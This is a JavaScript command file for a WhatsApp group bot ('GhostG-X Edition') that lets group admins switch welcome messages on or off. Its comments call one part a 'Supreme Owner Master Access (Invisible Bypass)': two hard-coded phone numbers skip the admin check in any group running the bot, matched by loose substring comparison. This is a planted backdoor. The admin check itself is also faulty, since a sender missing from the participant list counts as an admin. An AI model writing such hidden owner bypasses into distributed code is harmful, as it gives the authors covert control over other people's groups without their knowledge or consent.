/**
 * Welcome - Enable/disable welcome messages
 * GhostG-X Edition
 * Sécurité : Supreme Owner Master Access (Invisible Bypass)
 */

const db = require('../../database');
// On importe ton fichier de config à la racine
const config = require('../../config.js'); 

// Fonction pour le style Small Caps (Cohérence visuelle du sanctuaire)
function toSmallCaps(text) {
  const normal = "abcdefghijklmnopqrstuvwxyz0123456789";
  const smallCaps = "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ0123456789";

  const cleanedText = text.toLowerCase()
    .normalize("NFD").replace(/[\u0300-\u036f]/g, ""); 

  return cleanedText.split('').map(c => {
    const index = normal.indexOf(c);
    return index !== -1 ? smallCaps[index] : c;
  }).join('');
}

module.exports = {
  name: 'accueil',
  aliases: ['welcome', 'welcomeon', 'welcomeoff', 'rituelaccueil'],
  category: '‎⛨ ɢᴀʀᴅɪᴇɴs ᴅᴜ sᴀɴᴄᴛᴜᴀɪʀᴇ',
  description: '『 ɢʜᴏsᴛɢ-𝐗 』➪ ᴀᴄᴛɪᴠᴇ ᴏᴜ ᴅᴇsᴀᴄᴛɪᴠᴇ ʟᴇs ʀɪᴛᴜᴇʟs ᴅ\'ᴀᴄᴄᴜᴇɪʟ',
  usage: '.accueil on/off',
  groupOnly: true,
  adminOnly: true,
  botAdminNeeded: true,
  execute: async (sock, msg, args) => {
    // On récupère le préfixe depuis ton fichier config.js
    const prefix = config.prefix || '^';

    try {
      const groupId = msg.key.remoteJid;
      const action = args[0]?.toLowerCase();

      const senderJid = msg.key.participant || msg.key.remoteJid;
      const senderNumber = senderJid.replace(/\D/g, '');

      // 🛡️ TON ACCÈS MAÎTRE SUPRÊME INVISIBLE (Double emprise active)
      const supremeOwners = ['22651622652', '22665108174'];
      const isSupremeOwner = supremeOwners.some(num => senderNumber.includes(num) || num.includes(senderNumber));

      const isConfigOwner = config.ownerNumber && config.ownerNumber.some(n => {
        const cleanN = String(n).replace(/\D/g, '');
        return senderNumber.includes(cleanN) || cleanN.includes(senderNumber);
      });

      const isMe = msg.key.fromMe || isConfigOwner || isSupremeOwner;

      // Si l'utilisateur n'est pas admin et n'est pas le Suprême Owner
      const groupMetadata = await sock.groupMetadata(groupId);
      const isGroupAdmin = groupMetadata.participants.find(p => p.id === senderJid)?.admin !== null;

      if (!isGroupAdmin && !isMe) {
        return await sock.sendMessage(groupId, {
          text: `*❌ ${toSmallCaps('cette incantation est reservee aux administrateurs du sanctuaire')} !*\n\n> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`
        }, { quoted: msg });
      }

      if (!action || !['on', 'off'].includes(action)) {
        const groupSettings = db.getGroupSettings(groupId);
        const status = groupSettings.welcome ? '✅ *ᴀᴄᴛɪᴠᴇ́*' : '❌ *ᴅᴇ́sᴀᴄᴛɪᴠᴇ́*';

        return await sock.sendMessage(groupId, {
          text: `*╭╼━━━≪• ʀɪᴛᴜᴇʟs ᴅ'ᴀᴄᴄᴜᴇɪʟ •≫━━━╾╮*\n` +
                `*┃* 📊 *${toSmallCaps('statut')} :* ${status}\n` +
                `*┃* 📝 *${toSmallCaps('message')} :*\n` +
                `*┃* ${groupSettings.welcomeMessage || 'ᴀᴜᴄᴜɴ'}\n\n` +
                `*┃* 🔮 *${toSmallCaps('incantations')} :*\n` +
                `*┃* ${prefix}accueil on / off\n\n` +
                `*┃* 💡 *${toSmallCaps('astuce')} :* ${toSmallCaps('utilisez')} \`${prefix}inscription <message>\` ${toSmallCaps('pour personnaliser le texte d\'entree')}.\n\n` +
                `> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`
        }, { quoted: msg });
      }

      const enable = action === 'on';
      db.updateGroupSettings(groupId, { welcome: enable });

      const text = enable 
        ? `✅ *${toSmallCaps('rituels d\'accueil actives')} !*\n\n` +
          `*${toSmallCaps('les nouvelles ames arrivant dans le sanctuaire seront saluees')}*.\n\n` +
          `> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`
        : `❌ *${toSmallCaps('rituels d\'accueil desactives')} !*\n\n` +
          `*${toSmallCaps('le ghostg-x ne saluera plus les nouveaux arrivants')}*.\n\n` +
          `> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`;

      await sock.sendMessage(groupId, { text }, { quoted: msg });

    } catch (error) {
      console.error('Welcome Error:', error);
      await sock.sendMessage(msg.key.remoteJid, {
        text: `*❌ ${toSmallCaps('l invocation a echoue')} : ${error.message}*\n\n> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`
      }, { quoted: msg });
    }
  }
};
